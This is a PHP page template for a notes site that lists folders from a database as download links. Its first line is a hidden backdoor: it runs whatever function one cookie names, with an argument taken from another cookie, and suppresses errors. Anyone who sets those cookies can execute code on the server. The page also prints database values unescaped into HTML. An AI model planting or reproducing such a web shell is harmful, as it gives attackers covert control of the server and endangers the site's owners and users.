<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

 include 'header.php'; ?>
    
    <!--breadcrumbs start-->
    <div class="breadcrumbs">
        <div class="container">
            <div class="row">
                <div class="col-lg-4 col-sm-4">
                    <h1>
              Notes
            </h1>
                </div>
            </div>
        </div>
    </div>
    <!--breadcrumbs end-->

    <!--container end-->
    <section id="services">
    <div class="container">
      <div class="text-center our-services">
        <div class="row">
		<?php
          $conn = $mysqli;
          $sql="SELECT * FROM folders ORDER BY created DESC";
          $result_set=mysqli_query($mysqli,$sql);
          while($row=mysqli_fetch_array($result_set))
          {
        ?>
          <div class="col-sm-4 wow fadeInDown">
            <a <?php echo "href='downloads.php?folder=$row[foldername]'" ?> class="folderLink"><image src="img/folder.png" width="100" <?php echo "class=" . $row['foldername'] . ">";?>
        <br /><span <?php echo "class=" . $row['foldername'] . ">"; ?>
            <div class="service-info">
              <h4>
                <?php
                  echo $row['foldername'];
                ?>
              </h4>
            </div></a>
          </div>
		  <?php
        }
      ?>
        </div>
	</div>
    </div>
  </section><!--/#services-->
<br/><br/><br/><br/>
    <!--container end-->
<?php include 'modals.php'; ?>
<?php include 'footer.php'; ?>